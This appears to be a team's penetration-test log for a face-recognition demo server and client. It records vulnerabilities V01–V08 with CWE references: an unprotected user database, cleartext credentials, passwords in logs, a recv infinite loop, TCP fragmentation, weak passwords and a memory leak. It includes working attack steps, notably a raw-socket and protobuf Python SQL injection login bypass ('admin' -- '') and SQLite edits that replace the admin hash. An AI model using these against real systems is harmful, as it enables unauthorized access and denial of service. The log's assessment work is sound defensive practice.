
Vector (what attacker obtained)
...............................
realistic
 | [BASICINFO] - can attack only with server ip, port
 | [CLIENT/BINARY] - can attack with client binary exposed *
 | [CLIENT/SOURCE] - can attack with client source exposed
 | [SERVER/REMOTE] - can attack with server accessible
 | [SERVER/PHYSICAL] - can attack with server physically obtained
 | [SERVER/BINARY] - can attack with server binary exposed *
 v [SERVER/SOURCE] - can attack with server source exposed
unrealistic

(*: through binary reversing using tools such as IDA-pro, Ghidra)

Severity (vulnerability impact)
...............................
trivial
 | [ASSERT] - causes intended die but damages on availability
 | [BUG] - is problematic but no real impact is found
 | [HANG] - gets into a wrong state e.g. infinity loop
 | [CRASH] - causes e.g. unexpectedly segment fault or die
 v [EXPLOIT] - is exploitable, so can be pen-tested
severe

Approach (how we found the vulnerability)
.........................................
manual
 | [REVIEW/CODE] - done by reviewing code itself
 | [REVIEW/DESIGN] - done by reviewing documents or code
 | [FUZZING] - done by running fuzzing tools
 v [STATIC] - done by running static analysis tools
toolly

Exploit (named technique)
.........................
[SQLINJECTION] - for by-passing authentication
[OVERFLOW] - reading or writing beyond ligitimate area
[FORMATSTRING] - mainly used for leaking data on the stack
[PLAINKEY] - decrypting secure data using the plain key
[SNIFFING] - sniffing packets over the network
[SPOOFING] - so-called, man in the middle attack
[BRUTEFORCE] - trying all possible input

---

06/23
V01) insert a arbitrary id/password to DB
	Compromise Sequence
		1. modify tartan_user.db. insert new user with the SHA256 hashed password or replace the user's passwd.
		2. login success using new or modified user

	Vulnerabilities
		V01-1. sqlite3 database files(tartan_faces.db, tartan_user.db) have no password. So it can be accessed and modified by an attacker.
			CWE-916: Use of Password Hash With Insufficient Computational Effort https://cwe.mitre.org/data/definitions/916.html
			CWE-862: Missing Authorization https://cwe.mitre.org/data/definitions/862.html

	Approach
		V01-1.
			From install guide(tartan_install.sh), we found some db files are installed.
				$ cat tartan_install.sh
				....
				install tartan*.db /usr/local/tartan/
				....

			So we checked the tartan* db with sqlite3. it doesn't request any password, so we could check the data in the table.
			It consists of id, account, passwd, privilege columns. But the passwd field would be encrypted or hashed.
				$ sqlite3 tartan_user.db
				SQLite version 3.22.0 2018-01-22 18:45:57
				Enter ".help" for usage hints.
				sqlite> .table
				user

				sqlite> .schema user
				CREATE TABLE user (id INTEGER PRIMARY KEY AUTOINCREMENT , account TEXT, passwd TEXT, privilege INT);

				sqlite> select * from user;
				1|admin|e9b6ebe030d910d3b0c253b9bd05dfc365f1e17f61f2b64385898a8247b5b792|0
				2|lg|078156fd9debb7d481347e68ab19bb1f2d3028bcd61bc25994562f8a0d62e8e1|2

			To understand the logic related in the user credentials, we checked the source codes. So we found some code snippets related in the user id and the password.
			So we found that the SHA256 is used for the passwd.
				< mydb.cpp >
				gboolean
				CMydb::initialize_database_account()
				{
					...
					const char *sql = "DROP TABLE IF EXISTS user;"
									  "CREATE TABLE user (id INTEGER PRIMARY KEY AUTOINCREMENT , account TEXT, passwd TEXT, privilege INT);"
									  "INSERT INTO user VALUES(1, 'admin', 'e9b6ebe030d910d3b0c253b9bd05dfc365f1e17f61f2b64385898a8247b5b792' ,0);"
									  "INSERT INTO user VALUES(2, 'lg', '078156fd9debb7d481347e68ab19bb1f2d3028bcd61bc25994562f8a0d62e8e1' ,2);";
					...
				}

				< auth.cpp >
				int CAuth::login(string id, string passwd)
				{
					CMydb db;
					CCyper cyp;
					return db.find_user(id, cyp.get_passwd_enc(passwd));
				}

				< cyper.cpp >
				string
				CCyper::get_passwd_enc(string pass)
				{
					unsigned char digest[SHA256_DIGEST_LENGTH];

					SHA256_CTX ctx;
					SHA256_Init(&ctx);
					SHA256_Update(&ctx, pass.c_str(), pass.length());
					SHA256_Final(digest, &ctx);

					string str=bytes2hex(digest,SHA256_DIGEST_LENGTH );
					// printf("SHA256 digest: %s\n", str.c_str());
					return str;
				}

			Finally we change the db to what we want. Change the admin paswd to SHA256 hashed value of 'lg' and add new 'user'.
			So we can login 'admin/lg' and 'user/user' in the client program
				sqlite> replace into user values (1,'admin','0e6ba33f8bc8f41515b9d77c0e27c07ad66f2ae9b09dd7561729d6cd4d27c292',0);
				sqlite> insert into user values (3,'user','04f8996da763b7a969b1028ee3007569eaf3a635486ddab211d512c85b9df8fb',2);
				sqlite> select * from user;
				1|admin|0e6ba33f8bc8f41515b9d77c0e27c07ad66f2ae9b09dd7561729d6cd4d27c292|0
				2|lg|078156fd9debb7d481347e68ab19bb1f2d3028bcd61bc25994562f8a0d62e8e1|2
				3|user|04f8996da763b7a969b1028ee3007569eaf3a635486ddab211d512c85b9df8fb|2

06/24
V02) sniffing the id/password
	Compromise Sequence
		1. sniffing the network packet through Wireshark.
		2. select the 'Non secure' mode and push login button
		3. the id/password is checked by captured packet

	Vulnerabilities
		V02-1. the communication channel for the user credentials is not secure
			CWE-319: Cleartext Transmission of Sensitive Information https://cwe.mitre.org/data/definitions/319.html

	Approach
		V02-1.
			Capture TCP Packet using port number 50000 (=non-secure port)
			See wireshark packet in './V02/tcp_packet.pcapng'.
				No.     Time           Source                Destination           Protocol Length Info
					  4 0.126187       192.168.0.217         192.168.0.228         TCP      81     11505 â†’ 50000 [PSH, ACK] Seq=1 Ack=1 Win=204800 Len=27

				Frame 4: 81 bytes on wire (648 bits), 81 bytes captured (648 bits) on interface \Device\NPF_{0BA61C95-3362-49D2-9950-76429883512C}, id 0
				Ethernet II, Src: EFMNetwo_4c:1a:37 (00:26:66:4c:1a:37), Dst: IntelCor_da:66:5a (8c:c6:81:da:66:5a)
				Internet Protocol Version 4, Src: 192.168.0.217, Dst: 192.168.0.228
				Transmission Control Protocol, Src Port: 11505, Dst Port: 50000, Seq: 1, Ack: 1, Len: 27
				Data (27 bytes)

				0000  8c c6 81 da 66 5a 00 26 66 4c 1a 37 08 00 45 00   ....fZ.&fL.7..E.
				0010  00 43 98 24 40 00 80 06 df 82 c0 a8 00 d9 c0 a8   .C.$@...........
				0020  00 e4 2c f1 c3 50 02 60 87 7e bd 7a b0 8d 50 18   ..,..P.`.~.z..P.
				0030  c8 00 75 c5 00 00 53 42 31 54 1b 00 00 00 c7 8c   ..u...SB1T......
				0040  07 3c e8 03 00 00 0a 05 61 64 6d 69 6e 12 02 6c   .<......admin..l    ## It shows that the user id 'admin' and the password 'lg' are exposed.
				0050  67                                                g


V03) exposed user credentials in the server log
	Compromise Sequence
		1. start server and trace the logs ({git_repo_root}/LgFaceRecDemoTCP_Jetson_NanoV2/log.sh)
		2. attempt to login
		3. the logs show the user credentials including password like below.
			Jun 23 04:17:54 LgFaceRecProject LgFaceRecDemoTCP_Jetson_NanoV2[7447]: ACCOUNT=user PASSWORD=user
			Jun 23 04:17:54 LgFaceRecProject LgFaceRecDemoTCP_Jetson_NanoV2[7447]:  id:3  account:user, passwd:04f8996da763b7a969b1028ee3007569eaf3a635486ddab211d512c85b9df8fb, privilege:2
			Jun 23 04:17:54 LgFaceRecProject LgFaceRecDemoTCP_Jetson_NanoV2[7447]: OK You're a valid user : privilege=2

	Vulnerabilities
		V03-1. the logging information exposes too much information
			CWE-532: Insertion of Sensitive Information into Log File https://cwe.mitre.org/data/definitions/532.html

	Approach
		V03-1. just monitoring the log. we have no idea to find this vulnerability.


V04) infinite loop in the NetworkTCP.cpp
	Compromise Sequence
		1. execute 'python3 client.py'
			$ cat ./client.py
			#!/usr/bin/env python3

			import socket

			HOST = '192.168.0.228'
			PORT = 50000

			with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
				s.connect((HOST, PORT))
				s.sendall(b'Hello, world')

	Vulnerabilities
		V04-1. infinite loop in the ReadDataTcp function. because it doesn't handle the return value of 'recv' function correctly. it causes the denial of service.
			CWE-253: Incorrect Check of Function Return Value https://cwe.mitre.org/data/definitions/253.html

	Approach
		V04-1.
			when checking the man page of recv, it can return the 0 when a peer is disconnected.
				$ man recv
				...
				RETURN VALUE
				...
				When a stream socket peer has performed an orderly shutdown, the return value will be  0  (the
				traditional "end-of-file" return).
				...

			But in the source codes, there is no handling of the return 0 of the recv function.
			So if 'length' param is more than 0 and the recv returns 0 by disconnecting of the peer, the for loop is infinite.
				< NetworkTCP.cpp >
				ssize_t ReadDataTcp(TTcpConnectedPort *TcpConnectedPort,unsigned char *data, size_t length)
				{
					...
					for (size_t i = 0; i < length; i += bytes)
					{
						if ((bytes = recv(TcpConnectedPort->ConnectedFd, (char *)(data+i), length  - i,0)) == -1)
						{
							return (-1);
						}
						accumulated+=bytes;
						if (i==0) {
							...
						}
						if (my_packet_size==-1) {
							...
						}
						printf("accumulated packets=%zu   my_packet_size=%zd\n",accumulated, my_packet_size );
						if (my_packet_size>0 && accumulated>=my_packet_size)
							return accumulated;
					}
					return(length);
				}

V05) Unintentional handling of the protocol message
	Compromise Sequence
		1. <normal case> execute python statements below. and confirm login success
			>>> import socket
			>>> s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			>>> s.connect(('192.168.0.228', 50000))
			>>> s.sendall(b'\x53\x42\x31\x54\x1b\x00\x00\x00\xc7\x8c\x07\x3c\xe8\x03\x00\x00\x0a\x05\x61\x64\x6d\x69\x6e\x12\x02\x6c\x67') # send login protocol message with id:pass=admin:lg

		2. logout confirm by the statement below
			>>> s.close()

		3. <NG case> execute python statements below. and login is not succeeded.
			>>> import time
			>>> s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			>>> s.connect(('192.168.0.228', 50000)) # connect to the server
			>>> s.sendall(b'\x53\x42\x31\x54') # send preamble "SB1T" 1st
			>>> time.sleep(1) # wait
			>>> s.sendall(b'\x1b\x00\x00\x00\xc7\x8c\x07\x3c\xe8\x03\x00\x00\x0a\x05\x61\x64\x6d\x69\x6e\x12\x02\x6c\x67') # send remain payload to login

	Vulnerabilities
		V05-1. The length parameter is set abnormally in case of sending the preamble "SB1T" only
			CAPEC-494: TCP Fragmentation https://capec.mitre.org/data/definitions/494.html

	Approach
		V05-1.
			When receiving the 4bytes "SB1T" only and entering "if (i==0)" statement, the "MyPacket *p" is not filled enough.
			Caller initializes the all memory pointing of data to zero. So in this case, only p->hdr.head is written to the data of the received packet and others are zero.
			Finally, my_packet_size is changed to 0 and the next receiving data is not parsed correctly. And then keep looping until receiving the size of the value of 'length' input param.

			< NetworkTCP.cpp >
			ssize_t ReadDataTcp(TTcpConnectedPort *TcpConnectedPort,unsigned char *data, size_t length) // all memory pointing of data is zero. length is PACKET_MAX_BUFFER_SIZE (=1024 * 1024)
			{
				ssize_t bytes;
				ssize_t my_packet_size=-1;
				ssize_t accumulated=0;

				for (size_t i = 0; i < length; i += bytes)
				{
					if ((bytes = recv(TcpConnectedPort->ConnectedFd, (char *)(data+i), length  - i,0)) == -1)  // receiving 4 bytes "SB1T"
					{
						return (-1);
					}
					accumulated+=bytes;
					if (i==0) {
						MyPacket *p=(MyPacket*)data; // data is "SB1T\0\0\0\0\0\0\0...\0".
						printf("max packet length=%zu received=%zu packet_length=%d timestamp=%u msgtype=%d\n",
									length, bytes, p->hdr.size , p->hdr.timestamp, p->hdr.msgtype);
						if (p->hdr.head[0]=='S' && p->hdr.head[1]=='B' && p->hdr.head[2]=='1' && p->hdr.head[3]=='T') {
							my_packet_size=p->hdr.size; // p->hdr.size is 0
						}
						// print_pkt_header(data,60);
					}
					...
					if (my_packet_size>0 && accumulated>=my_packet_size) // when total received data is more than PACKET_MAX_BUFFER_SIZE, return the function.
						return accumulated;
				}
				return(length);
			}

			< ProtocolDef.h >
			#pragma pack(push, 1)
			typedef  struct {
				unsigned char head[4];
				uint32_t size;
				uint32_t timestamp;
				uint32_t msgtype;
			} MyPacketHeader;

			typedef  struct {
				MyPacketHeader hdr;
				unsigned char payload[0];
			} MyPacket;
			#pragma pack(pop)

6/25
V06) Weak Passwords that Enable Brute Force Attacks
	Compromise Sequence
		1. Brute Force Attack of Password

	Vulnerabilities
		V06-1. Weak Passwords that Enable Brute Force Attacks
			CWE-521: Weak Password Requirements https://cwe.mitre.org/data/definitions/521.html

	Approach
		1. Check the source codes of the client related in the password. We found that the password policy is 1~10 Random Alpha/Numeric. There is no minimum password length. When the length of password is less than 6, it has 56,800,235,584 combinations. It takes 1.10 hours or 0.05 days to crack the password. (reference: https://tmedweb.tulane.edu/content_open/bfcalc.php?uc=0&lc=0&nu=0&sc=0&ran=6&rans=0&dict=0)
			<MFCApplication1Dlg.cpp>
			BOOL CMFCApplication1Dlg::OnInitDialog()
			{
				...
				m_EditID.SetLimitText(10);
				m_EditPW.SetLimitText(10);
				...
				return TRUE;
			}

			void CMFCApplication1Dlg::OnBnClickedButtonLogin() // click login button
			{
				CString id;
				CString pw;
				m_EditID.GetWindowTextW(id);
				m_EditPW.GetWindowTextW(pw);
				if (id.IsEmpty() || checkIDPW(id) == false || pw.IsEmpty() || checkIDPW(pw) == false)
				{
					AfxMessageBox(_T("Please enter a valid ID and PW. (Alphabet, numeric only)"));
					return;
				}
				...
				// send login ID, PW
				string ids = string(CT2CA(id));
				string pws = string(CT2CA(pw));
				CLoginProtocol login(ids, pws);
				mNetworkManager->send_packet(login);
				SetTimer(REQ_TIMEOUT_TIMER, 5000, NULL);
				...
			}

V07) SQL Injection for Login
	Compromise Sequence
		1. Send SQL injection message to server like below:
			>>> import socket
			>>> s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			>>> s.connect(('192.168.0.228', 50000))
			>>> s.sendall(b'\x53\x42\x31\x54\x21\x00\x00\x00\xC7\x8C\x07\x3C\xE8\x03\x00\x00\x0A\x0B\x61\x64\x6D\x69\x6E\x27\x20\x2D\x2D\x20\x27\x12\x02\x30\x30')
			\x0A : id
			\x0B : id length
			\x61\x64\x6D\x69\x6E\x27\x20\x2D\x2D\x20\x27 : admin' -- '
			\x12 : password
			\x02 : password length
			\x30\x30 : 00

	Vulnerabilities
		V07-1. The server doesn't validate ID/PW from client, so attacker can login with SQL injection.
			CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection') https://cwe.mitre.org/data/definitions/89.html

	Approach
		1. Check the login source codes of the client and server. The client code validates ID/PW input, but the server does not.
			<mydb.cpp>
			int CMydb::find_user(string id, string passwd)
			{
				...
				std::ostringstream stringStream;
				stringStream << "SELECT * from user where account='";
				stringStream << id;
				stringStream << "' and passwd='";
				stringStream << passwd;
				stringStream << "';";
				string strstr = stringStream.str();
				char *sql = (char *)strstr.c_str();
				...
				if (sqlite3_prepare(db, sql, -1, &stmt, nullptr) == SQLITE_OK)
				{
					if (sqlite3_step(stmt) == SQLITE_ROW)
					{
						...
					}
				}
				else
				{
					SQL_CHECK("Error");
				}
				rc = sqlite3_exec(db, "END", 0, 0, 0);
				...
			}
		2. Make the protobuf message and code for ID/PW
			2-1. make protobuf message
				<protocolLogin.proto>
				syntax = "proto3";

				package protocol_msg;

				message LoginMsg {
					string user_id = 1;
					string password = 2;
				}

			2-2. build python module for message
				$ sudo apt install protobuf-compiler
				$ sudo pip install protobuf
				$ protoc -I="./" --python_out="./" protocolLogin.proto

			2-3. make SQL injection code using protobuf
				<login.py>
				# -*- coding: utf-8 -*-
				import protocolLogin_pb2
				import sys
				import socket

				# login protobuf
				login = protocolLogin_pb2.LoginMsg()
				login.user_id = "admin' -- '"
				login.password = "00"

				msg = login.SerializeToString()

				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.connect(('192.168.0.228', 50000))

				header = b'\x53\x42\x31\x54\x21\x00\x00\x00\xc7\x8c\x07\x3c\xe8\x03\x00\x00'	# preamble + size + timestamp + msgtype
				s.sendall(header + msg)

			2-4. send this message to server
				$ python3 login.py


6/28
V08) Memory leakeage in the 'get_a_packet' function
	Compromise Sequence
		1. Operate run mode
		2. Check the memory manager of the client system whether or not the occupation is increased.

	Vulnerabilities
		V08-1. The 'get_a_packet' function doesn't free the structure of the paresed received packet after use it.
			CWE-401: Missing Release of Memory after Effective Lifetime https://cwe.mitre.org/data/definitions/401.html

	Approach
		1. The occupation of the memory usage of the client program is increased continuously during the operation of system.
		2. Check the memory leakeage in source codes of the client program. The 'create_protocol_instance' function allocates the new memory. But the 'get_a_packet' function doesn't free the memory after the use. You can check the 'PagedMemorySize64' field of "Get-Process MFCApplication1" command of PowerShell.
			< Memory Check command in PowerShell> - PagedMemorySize64 (=The amount of memory, in bytes, allocated in the virtual memory paging file for the associated process. https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.process.pagedmemorysize64?view=net-5.0)
			PS C:\> Get-Process MFCApplication1 | select PagedMemorySize64, ProcessName

			PagedMemorySize64 ProcessName
			----------------- -----------
					 14893056 MFCApplication1

			< ProtocolManager.cpp >
			CBaseProtocol *
			CProtocolManager::create_protocol_instance(MsgReq id)
			{
				CBaseProtocol *cpkt = nullptr;
				switch (id)
				{
					case MSG_LOGIN:
						cpkt = new CLoginProtocol();
						break;
					case MSG_IMAGE:
						cpkt = new CImageProtocol();
						break;
					case MSG_CONTROL_MODE:
						cpkt = new CControlModeProtocol();
						break;
					case MSG_SERVER_SETTING:
						cpkt = new CServerSettingProtocol();
						break;
					case MSG_VIDEO_FILE_LIST:
						cpkt = new CVideoFileListProtocol();
						break;
					case MSG_START_LEARNING_MODE:
						cpkt = new CLearningModeProtocol();
						break;
					case MSG_ACK:
						cpkt = new CAckProtocol();
						break;
					default:
						break;
				}
				return cpkt; // return newly allocated memory
			}

			CBaseProtocol *CProtocolManager::parse_packet(MyPacket *ppkt) {
				CBaseProtocol *cpkt = nullptr;
				...
				if (ppkt->hdr.head[0]=='S' && ppkt->hdr.head[1]=='B' && ppkt->hdr.head[2]=='1' && ppkt->hdr.head[3]=='T' )
				{
					...
					cpkt=create_protocol_instance((MsgReq)ppkt->hdr.msgtype); // call create_protocol_instance function
					...
				}
				return cpkt;
			}

			< NetworkManager.cpp >
			bool NetworkManager::get_a_packet(Mat* pImage)
			{
				...
				if (ret <= PACKET_MAX_BUFFER_SIZE && ret > 0)
				{
					CProtocolManager prot_man;
					CBaseProtocol* pbase = dynamic_cast<CBaseProtocol*>(prot_man.parse_packet((MyPacket*)buff)); // call parse_packet function and get a newly allocated memory
					... // theer is no 'delete' keyword in order to free pbase.
				}
				...
			}

V09)
	Compromise Sequence

	Vulnerabilities
		V09-1.

	Approach